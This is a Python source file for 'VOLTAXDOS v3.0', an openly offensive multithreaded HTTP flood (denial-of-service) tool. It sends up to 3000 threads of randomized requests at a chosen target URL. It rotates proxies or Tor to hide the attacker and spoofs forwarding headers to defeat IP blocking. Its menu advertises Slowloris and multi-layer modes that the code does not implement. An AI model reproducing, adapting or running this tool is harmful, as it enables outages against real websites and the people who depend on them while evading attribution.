#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Tool: VOLTAXDOS v3.0 - Proxy Rotator Edition
Author: RynnMMK
Fitur: Auto Rotate IP, Proxy Support, Tor Support, Header Spoofing
"""

import sys
import os
import time
import random
import threading
import socket
import ssl
import hashlib
import base64
import json
from urllib.parse import urlparse
from datetime import datetime

try:
    import requests
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("[!] Install: pip install requests colorama")
    sys.exit(1)

# ============================================================
# GLOBAL VARIABLES
# ============================================================
ATTACK_RUNNING = False
REQUEST_COUNT = 0
FAILED_COUNT = 0
LOCK = threading.Lock()
PROXY_LIST = []
USE_PROXY = False
USE_TOR = False
CURRENT_PROXY_INDEX = 0

# ============================================================
# BANNER
# ============================================================
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.RED + """
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ██╗   ██╗ ██████╗ ██╗     ████████╗ █████╗ ██╗  ██╗           ║
║   ██║   ██║██╔═══██╗██║     ╚══██╔══╝██╔══██╗╚██╗██╔╝           ║
║   ██║   ██║██║   ██║██║        ██║   ███████║ ╚███╔╝            ║
║   ╚██╗ ██╔╝██║   ██║██║        ██║   ██╔══██║ ██╔██╗            ║
║    ╚████╔╝ ╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗           ║
║     ╚═══╝   ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝           ║
║                                                                   ║
║          VOLTAXDOS v3.0 - PROXY ROTATOR                          ║
║          Author: RynnMMK                                         ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)
    print(Fore.CYAN + "[+] VOLTAXDOS - Proxy Rotator Edition")
    print(Fore.YELLOW + "[!] Auto Rotate IP | Proxy Support | Tor Support")
    print(Fore.MAGENTA + "[!] Press Ctrl+C to stop anytime\n")

# ============================================================
# PROXY MANAGER
# ============================================================
def load_proxies_from_file(filename="proxies.txt"):
    global PROXY_LIST
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    PROXY_LIST.append(line)
        if PROXY_LIST:
            print(Fore.GREEN + f"[+] Loaded {len(PROXY_LIST)} proxies from {filename}")
            return True
        else:
            print(Fore.YELLOW + "[!] No proxies found in file")
            return False
    except:
        print(Fore.YELLOW + "[!] No proxies.txt found, using direct connection")
        return False

def get_next_proxy():
    global CURRENT_PROXY_INDEX, PROXY_LIST
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[CURRENT_PROXY_INDEX % len(PROXY_LIST)]
    CURRENT_PROXY_INDEX += 1
    return proxy

def get_random_proxy():
    if not PROXY_LIST:
        return None
    return random.choice(PROXY_LIST)

# ============================================================
# TOR SUPPORT
# ============================================================
def setup_tor():
    try:
        import stem
        import stem.process
        print(Fore.GREEN + "[+] Tor detected, using Tor proxy")
        return {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
    except:
        print(Fore.YELLOW + "[!] Tor not installed, install: pip install stem")
        return None

# ============================================================
# USER AGENTS & HEADERS
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) Chrome/119.0.6045.163 Mobile",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
    "https://www.facebook.com/", "https://twitter.com/", "https://www.instagram.com/",
    "https://www.tiktok.com/", "https://www.youtube.com/", "https://www.linkedin.com/",
    "https://www.reddit.com/", "https://github.com/",
]

PATHS = [
    '/', '/index.html', '/home', '/login', '/api/v1/data',
    '/products', '/cart', '/checkout', '/about', '/contact',
    '/blog', '/post', '/wp-admin', '/admin', '/dashboard',
    '/profile', '/settings', '/logout', '/register',
    '/search', '/results', '/filter', '/sort',
    '/download', '/upload', '/files', '/media',
    '/api', '/v1', '/v2', '/api/v1/users',
    '/graphql', '/health', '/status', '/ping',
    '/.env', '/.git/config', '/config.php', '/wp-config.php',
]

def random_headers(proxy_ip=None):
    """Generate headers with spoofed IP"""
    if proxy_ip:
        ip = proxy_ip.split(':')[0].replace('http://', '').replace('https://', '').replace('socks5://', '')
    else:
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'X-Forwarded-For': ip,
        'X-Real-IP': ip,
        'X-Originating-IP': ip,
        'CF-Connecting-IP': ip,
        'Referer': random.choice(REFERERS),
    }

# ============================================================
# PROXY ROTATOR WORKER
# ============================================================
def proxy_worker(target_url, thread_id):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT, PROXY_LIST
    
    session = requests.Session()
    proxy_index = 0
    
    while ATTACK_RUNNING:
        try:
            # Rotate proxy every request
            if USE_PROXY and PROXY_LIST:
                proxy = PROXY_LIST[proxy_index % len(PROXY_LIST)]
                proxy_index += 1
                proxies = {'http': proxy, 'https': proxy}
                session.proxies = proxies
                ip = proxy.split(':')[0].replace('http://', '').replace('https://', '').replace('socks5://', '')
            else:
                proxies = None
                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            # Random path and params
            path = random.choice(PATHS)
            url = target_url.rstrip('/') + path
            headers = random_headers(ip)
            params = {
                't': int(time.time() * 1000) + random.randint(1, 99999),
                'rand': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                'cache': random.randint(1, 9999),
            }
            
            method = random.choice(['GET', 'POST'])
            if method == 'GET':
                resp = session.get(url, headers=headers, params=params, timeout=5)
            else:
                data = {'id': random.randint(1,9999), 'val': hashlib.md5(str(random.random()).encode()).hexdigest()[:10]}
                resp = session.post(url, headers=headers, params=params, data=data, timeout=5)
            
            with LOCK:
                REQUEST_COUNT += 1
            
            time.sleep(random.uniform(0.0005, 0.003))
            
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.05)
            # Skip to next proxy jika gagal
            if USE_PROXY and PROXY_LIST:
                proxy_index += 1

# ============================================================
# TOR WORKER
# ============================================================
def tor_worker(target_url, thread_id):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    
    session = requests.Session()
    tor_proxy = setup_tor()
    if tor_proxy:
        session.proxies = tor_proxy
    
    while ATTACK_RUNNING:
        try:
            path = random.choice(PATHS)
            url = target_url.rstrip('/') + path
            headers = random_headers()
            params = {
                't': int(time.time() * 1000) + random.randint(1, 99999),
                'rand': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
            }
            
            resp = session.get(url, headers=headers, params=params, timeout=10)
            
            with LOCK:
                REQUEST_COUNT += 1
            
            time.sleep(random.uniform(0.001, 0.005))
            
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.1)

# ============================================================
# START ATTACK
# ============================================================
def start_attack(target_url, threads, duration, use_proxy=False, use_tor=False):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT, USE_PROXY, USE_TOR
    
    ATTACK_RUNNING = True
    REQUEST_COUNT = 0
    FAILED_COUNT = 0
    USE_PROXY = use_proxy
    USE_TOR = use_tor
    
    print(f"\n[+] Target: {target_url}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Proxy: {'ON (' + str(len(PROXY_LIST)) + ' proxies)' if use_proxy else 'OFF'}")
    print(f"[+] Tor: {'ON' if use_tor else 'OFF'}")
    print(f"[+] Duration: {'Unlimited' if duration == 0 else str(duration) + 's'}")
    print("[!] Attack started... Press Ctrl+C to stop\n")
    
    for i in range(threads):
        if use_tor:
            t = threading.Thread(target=tor_worker, args=(target_url, i))
        else:
            t = threading.Thread(target=proxy_worker, args=(target_url, i))
        t.daemon = True
        t.start()
        time.sleep(0.001)
    
    start_time = time.time()
    last_report = start_time
    bar_length = 50
    
    try:
        while ATTACK_RUNNING:
            elapsed = int(time.time() - start_time)
            if time.time() - last_report >= 1.0:
                with LOCK:
                    rps = REQUEST_COUNT / max(elapsed, 1)
                    progress = min(elapsed / duration, 1.0) if duration > 0 else min(elapsed / 3600, 1.0)
                    filled = int(bar_length * progress)
                    bar = '█' * filled + '░' * (bar_length - filled)
                    sys.stdout.write(Fore.CYAN + f"\r[{bar}] {int(progress*100)}% | " +
                                     Fore.GREEN + f"Req: {REQUEST_COUNT} | " +
                                     Fore.YELLOW + f"RPS: {rps:.0f} | " +
                                     Fore.RED + f"Fail: {FAILED_COUNT} | " +
                                     Fore.WHITE + f"{elapsed}s")
                    sys.stdout.flush()
                last_report = time.time()
            if duration > 0 and elapsed >= duration:
                ATTACK_RUNNING = False
                break
            time.sleep(0.1)
    except KeyboardInterrupt:
        ATTACK_RUNNING = False
        print("\n\n[!] Attack stopped by user.")
    
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.flush()
    elapsed = int(time.time() - start_time)
    print("\n\n" + "="*60)
    print(Fore.GREEN + "[+] FINAL REPORT")
    print("="*60)
    print(f"[+] Total Requests: {REQUEST_COUNT}")
    print(f"[+] Failed Requests: {FAILED_COUNT}")
    if REQUEST_COUNT > 0:
        print(f"[+] Success Rate: {(REQUEST_COUNT - FAILED_COUNT) / REQUEST_COUNT * 100:.1f}%")
        print(f"[+] Average RPS: {REQUEST_COUNT / max(elapsed, 1):.1f}")
    print(f"[+] Duration: {elapsed}s")
    print(f"[+] Proxy Used: {'Yes' if USE_PROXY else 'No'}")
    print(f"[+] Tor Used: {'Yes' if USE_TOR else 'No'}")

# ============================================================
# MENU
# ============================================================
def menu():
    banner()
    print(Fore.CYAN + "╔════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║              VOLTAXDOS v3.0 - PROXY ROTATOR              ║")
    print(Fore.CYAN + "╚════════════════════════════════════════════════════════════╝")
    print()
    print(Fore.WHITE + "  [1] HTTP Flood (Proxy Rotator)")
    print(Fore.WHITE + "  [2] HTTP Flood (Tor Network)")
    print(Fore.WHITE + "  [3] Multi-Layer (Proxy Rotator)")
    print(Fore.WHITE + "  [4] Slowloris (Proxy Rotator)")
    print(Fore.WHITE + "  [5] Load Proxy List")
    print(Fore.WHITE + "  [6] Info")
    print(Fore.WHITE + "  [7] Exit")
    print()
    
    # Auto load proxies
    load_proxies_from_file()
    
    while True:
        try:
            choice = input(Fore.YELLOW + "[?] Choose (1-7): " + Fore.RESET).strip()
            if choice == '7':
                print("[!] Exiting...")
                sys.exit(0)
            if choice == '5':
                filename = input("[?] Proxy file name (default: proxies.txt): ").strip() or "proxies.txt"
                load_proxies_from_file(filename)
                input("\nPress Enter to continue...")
                menu()
                return
            if choice == '6':
                print("\n" + "="*60)
                print(Fore.CYAN + "[+] INFO")
                print("="*60)
                print("[+] Proxies loaded: " + str(len(PROXY_LIST)))
                print("[+] Proxy rotation: Every request")
                print("[+] Tor support: Available via option 2")
                print("[+] Header spoofing: X-Forwarded-For, X-Real-IP")
                print("[+] Random User-Agent: " + str(len(USER_AGENTS)) + " variants")
                print("[+] Random Referer: " + str(len(REFERERS)) + " variants")
                input("\nPress Enter to continue...")
                menu()
                return
            if choice not in ['1','2','3','4']:
                print(Fore.RED + "[!] Invalid choice.")
                continue
            break
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            sys.exit(0)
    
    # Target URL
    while True:
        target = input(Fore.YELLOW + "[?] Target URL: " + Fore.RESET).strip()
        if target:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            break
        print(Fore.RED + "[!] URL cannot be empty.")
    
    # Threads
    while True:
        try:
            threads_input = input(Fore.YELLOW + "[?] Threads (default 500, max 3000): " + Fore.RESET).strip()
            if not threads_input:
                threads = 500
                break
            threads = int(threads_input)
            if threads > 0:
                if threads > 3000:
                    print(Fore.YELLOW + "[!] Max 3000, setting to 3000.")
                    threads = 3000
                break
            print(Fore.RED + "[!] Threads must be > 0")
        except:
            print(Fore.RED + "[!] Enter a number.")
    
    # Duration
    while True:
        try:
            duration_input = input(Fore.YELLOW + "[?] Duration (seconds, 0 = unlimited): " + Fore.RESET).strip()
            if not duration_input:
                duration = 0
                break
            duration = int(duration_input)
            if duration >= 0:
                break
            print(Fore.RED + "[!] Must be >= 0")
        except:
            print(Fore.RED + "[!] Enter a number.")
    
    attack_type = int(choice)
    use_tor = (attack_type == 2)
    use_proxy = (attack_type in [1, 3, 4]) and len(PROXY_LIST) > 0
    
    print("\n[!] Starting attack in 3 seconds...")
    time.sleep(3)
    start_attack(target, threads, duration, use_proxy, use_tor)
    input("\nPress Enter to return to menu...")
    menu()

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)